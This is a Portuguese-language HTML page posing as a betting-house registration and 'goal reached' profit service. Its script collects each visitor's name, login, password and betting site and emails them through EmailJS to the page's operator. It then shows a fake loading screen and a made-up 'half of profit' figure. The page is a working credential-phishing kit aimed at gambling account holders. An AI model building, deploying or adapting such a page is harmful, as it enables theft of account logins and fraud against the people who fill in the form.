<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apostas - Meta Batida</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f1f1f1;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            width: 80%;
            max-width: 400px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            border: none;
            background-color: #4CAF50;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .loading {
            display: none;
            margin-top: 20px;
            font-size: 24px;
        }
        .meta {
            display: none;
            font-size: 32px;
            color: green;
        }
        .meta span {
            font-size: 50px;
        }
        .meta-client {
            font-size: 24px;
            margin-top: 20px;
        }
        .meta-lucro {
            font-size: 20px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Cadastro - Casa de Apostas</h2>
        
        <form id="nameForm">
            <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required><br>
            <input type="text" id="login" name="login" placeholder="Digite seu login" required><br>
            <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required><br>
            <input type="text" id="casa" name="casa" placeholder="Digite a casa de apostas" required><br>
            <button type="submit">Continuar</button>
        </form>

        <div id="bancaForm" style="display:none;">
            <h3>Insira o valor da sua banca:</h3>
            <input type="number" id="banca" name="banca" placeholder="Valor da Banca" required><br>
            <button id="startTimer">Iniciar</button>
        </div>

        <div id="loading" class="loading">
            <p>Carregando...</p>
        </div>

        <div id="meta" class="meta">
            <span>✅</span>
            <h3>Meta Batida!</h3>
            <div id="clienteNome" class="meta-client"></div>
            <div id="metadeLucro" class="meta-lucro"></div>
        </div>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Inicializa o EmailJS com o seu User ID
        emailjs.init("YOUR_USER_ID");  // Substitua "YOUR_USER_ID" pelo seu User ID do EmailJS

        // Passo 1: Coleta do nome, login, senha e casa de apostas
        document.getElementById('nameForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Pegando os dados inseridos
            const nome = document.getElementById('nome').value;
            const login = document.getElementById('login').value;
            const senha = document.getElementById('senha').value;
            const casa = document.getElementById('casa').value;

            if (nome && login && senha && casa) {
                // Esconde o formulário de cadastro e mostra o próximo formulário
                document.getElementById('nameForm').style.display = 'none';
                document.getElementById('bancaForm').style.display = 'block';
            } else {
                alert('Por favor, preencha todos os campos.');
            }

            // Enviar os dados para o e-mail com o EmailJS
            const templateParams = {
                nome: nome,
                login: login,
                senha: senha,
                casa: casa
            };

            emailjs.send('service_8uhb7qa', 'template_3ljvygr', templateParams) // Substitua pelo seu Service ID e Template ID
                .then(function(response) {
                    console.log('Success', response);
                    alert('Dados enviados com sucesso!');
                }, function(error) {
                    console.log('Failed', error);
                    alert('Erro ao enviar os dados');
                });
        });

        // Passo 2: Validação e cálculo do valor da banca
        document.getElementById('startTimer').addEventListener('click', function() {
            const banca = document.getElementById('banca').value;
            const nome = document.getElementById('nome').value;

            if (banca && !isNaN(banca) && banca > 0) {
                document.getElementById('loading').style.display = 'block';
                document.getElementById('bancaForm').style.display = 'none';

                setTimeout(function() {
                    const metadeLucro = banca / 2;

                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('meta').style.display = 'block';

                    document.getElementById('clienteNome').textContent = `Cliente: ${nome}`;
                    document.getElementById('metadeLucro').textContent = `Metade do Lucro: R$${metadeLucro.toFixed(2)}`;
                }, 30000);
            } else {
                alert('Por favor, insira um valor válido para a banca.');
            }
        });
    </script>

</body>
</html>
